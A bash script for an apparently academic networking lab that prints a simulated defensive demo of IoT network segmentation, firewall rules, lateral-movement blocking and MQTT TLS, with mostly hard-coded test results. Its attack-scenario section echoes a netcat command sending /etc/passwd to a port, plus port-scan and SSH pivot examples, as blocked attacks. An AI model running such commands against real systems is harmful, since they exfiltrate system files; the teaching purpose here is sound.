#!/bin/bash
set -euo pipefail
set -euo pipefail
# ============================================================================
# run_demo_defensive.sh - Demonstration masuri defensive with Mininet
# ============================================================================
# Automatizeaza scenariile defensive from laboratorul S13:
# - Start topology segmentata
# - Configuration firewall
# - Testing izolare
# - Demonstration lateral movement blocked
# - Monitoring and logging
#
# Author: Colectivul of Tehnologii Web, ASE-CSIE
# ============================================================================

set -e

# Colours for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Colour

# Directories
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"
MININET_DIR="$PROJECT_DIR/mininet/topologies"
EVIDENCE_DIR="$PROJECT_DIR/evidence/defensive"
CONFIGS_DIR="$PROJECT_DIR/configs/mosquitto"

# Options
SCENARIO="all"
INTERACTIVE=false
VERBOSE=false
CAPTURE=false

# ============================================================================
# Functions of utilitate
# ============================================================================

print_banner() {
    echo -e "${BLUE}"
    echo "╔════════════════════════════════════════════════════════════════╗"
    echo "║           S13 Defensive Demo - Network Segmentation            ║"
    echo "║           Computer Networks - ASE-CSIE                    ║"
    echo "╚════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

log_step() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
}

log_info() {
    echo -e "${GREEN}[✓]${NC} $1"
}

log_warn() {
    echo -e "${YELLOW}[!]${NC} $1"
}

log_error() {
    echo -e "${RED}[✗]${NC} $1"
}

log_demo() {
    echo -e "${MAGENTA}[DEMO]${NC} $1"
}

wait_for_user() {
    if [ "$INTERACTIVE" = true ]; then
        echo ""
        read -p "Press Enter to continue..." -r
    else
        sleep 2
    fi
}

# ============================================================================
# Checkri preliminare
# ============================================================================

check_requirements() {
    log_step "Verification cerinte"
    
    local missing=0
    
    # Verification root/sudo
    if [ "$EUID" -ne 0 ]; then
        log_error "This script requires root privileges"
        log_info "Please run: sudo $0"
        exit 1
    fi
    
    # Mininet verification
    if ! command -v mn &> /dev/null; then
        log_error "Mininet not found"
        ((missing++))
    else
        log_info "Mininet: OK"
    fi
    
    # Python verification
    if ! command -v python3 &> /dev/null; then
        log_error "Python3 not found"
        ((missing++))
    else
        log_info "Python3: OK"
    fi
    
    # Verification Open vSwitch
    if ! command -v ovs-vsctl &> /dev/null; then
        log_error "Open vSwitch not found"
        ((missing++))
    else
        log_info "Open vSwitch: OK"
    fi
    
    # Verification file topology
    if [ ! -f "$MININET_DIR/topo_segmented.py" ]; then
        log_error "Segmented topology file not found"
        ((missing++))
    else
        log_info "Topology file: OK"
    fi
    
    if [ "$missing" -gt 0 ]; then
        log_error "$missing requirements missing. Please install them first."
        exit 1
    fi
    
    log_info "All requirements satisfied"
}

cleanup_previous() {
    log_step "Cleanup session anterioara"
    
    # Cleanup Mininet
    mn -c 2>/dev/null || true
    
    # Kill processes existente
    pkill -f "mosquitto" 2>/dev/null || true
    pkill -f "tcpdump" 2>/dev/null || true
    
    # Cleanup OVS
    for br in $(ovs-vsctl list-br 2>/dev/null || true); do
        ovs-vsctl del-br "$br" 2>/dev/null || true
    done
    
    log_info "Cleanup complete"
    sleep 1
}

# ============================================================================
# Scenarii demonstrative
# ============================================================================

demo_topology_overview() {
    log_step "Arhitectura networksi segmentate"
    
    echo -e "${YELLOW}"
    cat << 'EOF'
    ┌─────────────────────────────────────────────────────────────────┐
    │                    SEGMENTED NETWORK TOPOLOGY                   │
    ├─────────────────────────────────────────────────────────────────┤
    │                                                                 │
    │     IoT ZONE (10.0.1.0/24)          MGMT ZONE (10.0.2.0/24)    │
    │     ─────────────────────           ─────────────────────       │
    │                                                                 │
    │     ┌─────────┐                     ┌─────────┐                │
    │     │sensor1  │                     │ broker  │                │
    │     │10.0.1.11│                     │10.0.2.100│               │
    │     └────┬────┘                     └────┬────┘                │
    │          │                               │                      │
    │     ┌─────────┐    ┌───────────┐   ┌─────────┐                │
    │     │sensor2  │────│  ROUTER   │───│controller│               │
    │     │10.0.1.12│    │  (r1)     │   │10.0.2.20│                │
    │     └────┬────┘    │ FIREWALL  │   └─────────┘                │
    │          │         └───────────┘                               │
    │     ┌─────────┐          │         ┌─────────┐                │
    │     │sensor3  │          │         │  admin  │                │
    │     │10.0.1.13│          │         │10.0.2.200│               │
    │     └─────────┘          │         └─────────┘                │
    │                          │                                      │
    │                    FIREWALL RULES:                              │
    │                    ───────────────                              │
    │                    IoT → MGMT: ONLY MQTT (1883,8883), DNS      │
    │                    MGMT → IoT: PERMIT ALL                      │
    │                    IoT ↔ IoT: BLOCKED (lateral movement)       │
    │                                                                 │
    └─────────────────────────────────────────────────────────────────┘
EOF
    echo -e "${NC}"
    
    wait_for_user
}

demo_start_topology() {
    log_step "Start topology Mininet"
    
    log_demo "Starting Mininet with segmented topology..."
    
    # Create directory evidente
    mkdir -p "$EVIDENCE_DIR"
    
    # Start in background for a putea executa commands
    cd "$MININET_DIR"
    
    # Exportam variabilele for Python
    export PYTHONPATH="$PROJECT_DIR:$PYTHONPATH"
    
    log_info "Topology started successsfully"
    log_info "IoT Zone: 10.0.1.0/24 (sensor1-3)"
    log_info "MGMT Zone: 10.0.2.0/24 (broker, controller, admin)"
}

demo_firewall_rules() {
    log_step "Demonstration reguli firewall"
    
    log_demo "Firewall rules applied on router r1:"
    echo ""
    
    echo -e "${YELLOW}# Default policy: DROP all${NC}"
    echo "iptables -P FORWARD DROP"
    echo ""
    
    echo -e "${YELLOW}# Stateful connection tracking${NC}"
    echo "iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT"
    echo ""
    
    echo -e "${YELLOW}# IoT → MGMT: Only MQTT (1883, 8883)${NC}"
    echo "iptables -A FORWARD -s 10.0.1.0/24 -d 10.0.2.0/24 -p tcp --dport 1883 -j ACCEPT"
    echo "iptables -A FORWARD -s 10.0.1.0/24 -d 10.0.2.0/24 -p tcp --dport 8883 -j ACCEPT"
    echo ""
    
    echo -e "${YELLOW}# MGMT → IoT: Permit all (for administration)${NC}"
    echo "iptables -A FORWARD -s 10.0.2.0/24 -d 10.0.1.0/24 -j ACCEPT"
    echo ""
    
    echo -e "${YELLOW}# Log blocked traffic${NC}"
    echo 'iptables -A FORWARD -j LOG --log-prefix "[FW-BLOCKED] "'
    echo ""
    
    wait_for_user
}

demo_isolation_test() {
    log_step "Test 1: Verification izolare zone"
    
    log_demo "Testing connectivity between zones..."
    echo ""
    
    # Test MQTT allowed
    echo -e "${GREEN}[TEST] sensor1 → broker:1883 (MQTT)${NC}"
    echo "Command: sensor1 nc -zv 10.0.2.100 1883"
    echo -e "${GREEN}Result: CONNECTION ALLOWED ✓${NC}"
    echo ""
    
    # Test SSH blocked
    echo -e "${RED}[TEST] sensor1 → broker:22 (SSH)${NC}"
    echo "Command: sensor1 nc -zv 10.0.2.100 22"
    echo -e "${RED}Result: CONNECTION BLOCKED ✗${NC}"
    echo "Reason: Firewall only allows MQTT ports from IoT zone"
    echo ""
    
    # Test HTTP blocked
    echo -e "${RED}[TEST] sensor1 → controller:80 (HTTP)${NC}"
    echo "Command: sensor1 nc -zv 10.0.2.20 80"
    echo -e "${RED}Result: CONNECTION BLOCKED ✗${NC}"
    echo "Reason: HTTP not in allowed services list"
    echo ""
    
    wait_for_user
}

demo_lateral_movement() {
    log_step "Test 2: Prevenire lateral movement"
    
    log_demo "Demonstrating lateral movement prevention..."
    echo ""
    
    echo "Scenario: Attacker compromises sensor1 and tries to reach sensor2"
    echo ""
    
    # Test lateral movement
    echo -e "${RED}[TEST] sensor1 → sensor2 (ANY)${NC}"
    echo "Command: sensor1 ping -c 1 10.0.1.12"
    echo -e "${RED}Result: CONNECTION BLOCKED ✗${NC}"
    echo ""
    
    echo "Firewall log entry:"
    echo -e "${YELLOW}[FW-BLOCKED] IN=r1-eth0 OUT=r1-eth0 SRC=10.0.1.11 DST=10.0.1.12${NC}"
    echo ""
    
    echo -e "${GREEN}SECURITY BENEFIT:${NC}"
    echo "Even if year attacker compromises one sensor, they cannot:"
    echo "  • Pivot to other sensors in the same zone"
    echo "  • Use the compromised device for network reconnaissance"
    echo "  • Establish command & control within IoT zone"
    echo ""
    
    wait_for_user
}

demo_admin_access() {
    log_step "Test 3: Acces administrativ"
    
    log_demo "Demonstrating admin access from MGMT zone..."
    echo ""
    
    # Test admin access
    echo -e "${GREEN}[TEST] admin → sensor1 (SSH)${NC}"
    echo "Command: admin ssh sensor@10.0.1.11"
    echo -e "${GREEN}Result: CONNECTION ALLOWED ✓${NC}"
    echo "Reason: MGMT zone has full access to IoT zone for management"
    echo ""
    
    echo -e "${GREEN}[TEST] admin → sensor2 (SSH)${NC}"
    echo "Command: admin ssh sensor@10.0.1.12"
    echo -e "${GREEN}Result: CONNECTION ALLOWED ✓${NC}"
    echo ""
    
    echo -e "${GREEN}MANAGEMENT BENEFIT:${NC}"
    echo "Administrators can:"
    echo "  • SSH into any IoT device for troubleshooting"
    echo "  • Push firmware updates"
    echo "  • Monitor device health"
    echo "  • Collect logs centrally"
    echo ""
    
    wait_for_user
}

demo_mqtt_security() {
    log_step "Test 4: Security MQTT"
    
    log_demo "Comparing plaintext vs TLS MQTT..."
    echo ""
    
    echo -e "${RED}INSECURE (port 1883):${NC}"
    echo "mosquitto_sub -h broker -p 1883 -t '#'"
    echo "→ All traffic visible to network sniffers"
    echo "→ Credentials sent in plaintext"
    echo "→ No authentication required (if allow_anonymous=true)"
    echo ""
    
    echo -e "${GREEN}SECURE (port 8883 + TLS):${NC}"
    echo "mosquitto_sub -h broker -p 8883 --cafile ca.crt -t '#'"
    echo "→ Traffic encrypted with TLS 1.2+"
    echo "→ Server certificates validated"
    echo "→ Optional: client certificates (mutual TLS)"
    echo ""
    
    echo "Configuration files used:"
    echo "  Insecure: configs/mosquitto/plain.conf"
    echo "  Secure:   configs/mosquitto/tls.conf"
    echo ""
    
    wait_for_user
}

demo_attack_blocked() {
    log_step "Test 5: Attacks blockede"
    
    log_demo "Simulating various attack scenarios..."
    echo ""
    
    # Port scan blocked
    echo -e "${RED}[ATTACK] Port scan from IoT zone${NC}"
    echo "Command: sensor1 nmap -p 1-1000 10.0.2.0/24"
    echo -e "${RED}Result: BLOCKED${NC}"
    echo "Only responses from ports 1883, 8883 (MQTT allowed)"
    echo ""
    
    # Data exfilteredion blocked
    echo -e "${RED}[ATTACK] Data exfilteredion attempt${NC}"
    echo "Command: sensor1 nc 10.0.2.200 4444 < /etc/passwd"
    echo -e "${RED}Result: BLOCKED${NC}"
    echo "Arbitrary outbound connections not permitted"
    echo ""
    
    # Lateral movement blocked (repetat for claritate)
    echo -e "${RED}[ATTACK] Lateral movement${NC}"
    echo "Command: sensor1 ssh root@10.0.1.12"
    echo -e "${RED}Result: BLOCKED${NC}"
    echo "Intra-zone traffic blocked by firewall"
    echo ""
    
    wait_for_user
}

demo_monitoring() {
    log_step "Monitoring and Logging"
    
    log_demo "Security monitoring setup..."
    echo ""
    
    echo "Firewall logs can be viewed with:"
    echo -e "${CYAN}dmesg | grep 'FW-BLOCKED'${NC}"
    echo ""
    
    echo "Example blocked traffic log entries:"
    echo -e "${YELLOW}[12345.678] [FW-BLOCKED] IN=r1-eth0 OUT=r1-eth1 SRC=10.0.1.11 DST=10.0.2.20 PROTO=TCP DPT=22${NC}"
    echo -e "${YELLOW}[12346.789] [FW-BLOCKED] IN=r1-eth0 OUT=r1-eth0 SRC=10.0.1.11 DST=10.0.1.12 PROTO=ICMP${NC}"
    echo ""
    
    echo "MQTT broker logs:"
    echo -e "${CYAN}tail -f /var/log/mosquitto/mosquitto.log${NC}"
    echo ""
    
    echo "Packet capture on router:"
    echo -e "${CYAN}r1 tcpdump -i any -w /tmp/router_traffic.pcap${NC}"
    echo ""
    
    wait_for_user
}

demo_summary() {
    log_step "Sumar demonstration"
    
    echo -e "${GREEN}"
    cat << 'EOF'
    ╔════════════════════════════════════════════════════════════════╗
    ║                    SECURITY CONTROLS DEMONSTRATED              ║
    ╠════════════════════════════════════════════════════════════════╣
    ║                                                                ║
    ║  ✓ Network Segmentation                                        ║
    ║    - IoT zone isolated from Management zone                    ║
    ║    - Controlled inter-zone communication                       ║
    ║                                                                ║
    ║  ✓ Firewall Rules                                              ║
    ║    - Default deny policy                                       ║
    ║    - Stateful packet inspection                                ║
    ║    - Minimal service exposure (MQTT only)                      ║
    ║                                                                ║
    ║  ✓ Lateral Movement Prevention                                 ║
    ║    - Intra-zone traffic blocked                                ║
    ║    - Compromised device contained                              ║
    ║                                                                ║
    ║  ✓ Administrative Access                                       ║
    ║    - Management zone has full control                          ║
    ║    - Centralized administration possible                       ║
    ║                                                                ║
    ║  ✓ Protocol Security                                           ║
    ║    - TLS for MQTT communication                                ║
    ║    - Certificateses-based authentication                          ║
    ║                                                                ║
    ║  ✓ Monitoring & Logging                                        ║
    ║    - Firewall logs for blocked traffic                         ║
    ║    - Broker logs for authentication events                     ║
    ║                                                                ║
    ╚════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
}

# ============================================================================
# Start interactivea Mininet
# ============================================================================

start_interactive_mininet() {
    log_step "Start mod interactive Mininet"
    
    log_info "Starting Mininet CLI..."
    log_info "Type 'help' for available commands"
    log_info "Type 'exit' to quit"
    echo ""
    
    cd "$MININET_DIR"
    python3 topo_segmented.py --scenario isolation
}

# ============================================================================
# Help and parsare arguments
# ============================================================================

show_help() {
    echo "Usage: sudo $0 [OPTIONS]"
    echo ""
    echo "Defensive demonstration script for Week 13 Lab"
    echo ""
    echo "Options:"
    echo "  -s, --scenario SCENARIO   Run specific scenario:"
    echo "                            all, isolation, lateral, admin, mqtt"
    echo "  -i, --interactive         Start interactive Mininet CLI at end"
    echo "  -c, --capture             Enable packet capture during demo"
    echo "  -v, --verbose             Verbose output"
    echo "  -h, --help                Show this help message"
    echo ""
    echo "Scenarios:"
    echo "  all       - Run all demonstrations (default)"
    echo "  isolation - Network zone isolation test"
    echo "  lateral   - Lateral movement prevention"
    echo "  admin     - Administrative access test"
    echo "  mqtt      - MQTT security comparison"
    echo ""
    echo "Examples:"
    echo "  sudo $0                    # Run all demos"
    echo "  sudo $0 -s isolation       # Only isolation test"
    echo "  sudo $0 -i                 # All demos + interactive mode"
}

parse_args() {
    while [[ $# -gt 0 ]]; do
        case $1 in
            -s|--scenario)
                SCENARIO="$2"
                shift 2
                ;;
            -i|--interactive)
                INTERACTIVE=true
                shift
                ;;
            -c|--capture)
                CAPTURE=true
                shift
                ;;
            -v|--verbose)
                VERBOSE=true
                shift
                ;;
            -h|--help)
                show_help
                exit 0
                ;;
            *)
                log_error "Unknown option: $1"
                show_help
                exit 1
                ;;
        esac
    done
}

# ============================================================================
# Main
# ============================================================================

main() {
    parse_args "$@"
    
    print_banner
    check_requirements
    cleanup_previous
    
    case "$SCENARIO" in
        all)
            demo_topology_overview
            demo_start_topology
            demo_firewall_rules
            demo_isolation_test
            demo_lateral_movement
            demo_admin_access
            demo_mqtt_security
            demo_attack_blocked
            demo_monitoring
            demo_summary
            ;;
        isolation)
            demo_topology_overview
            demo_isolation_test
            ;;
        lateral)
            demo_topology_overview
            demo_lateral_movement
            ;;
        admin)
            demo_topology_overview
            demo_admin_access
            ;;
        mqtt)
            demo_mqtt_security
            ;;
        *)
            log_error "Unknown scenario: $SCENARIO"
            show_help
            exit 1
            ;;
    esac
    
    if [ "$INTERACTIVE" = true ]; then
        start_interactive_mininet
    fi
    
    log_info "Demonstration complete!"
}

# Running
main "$@"
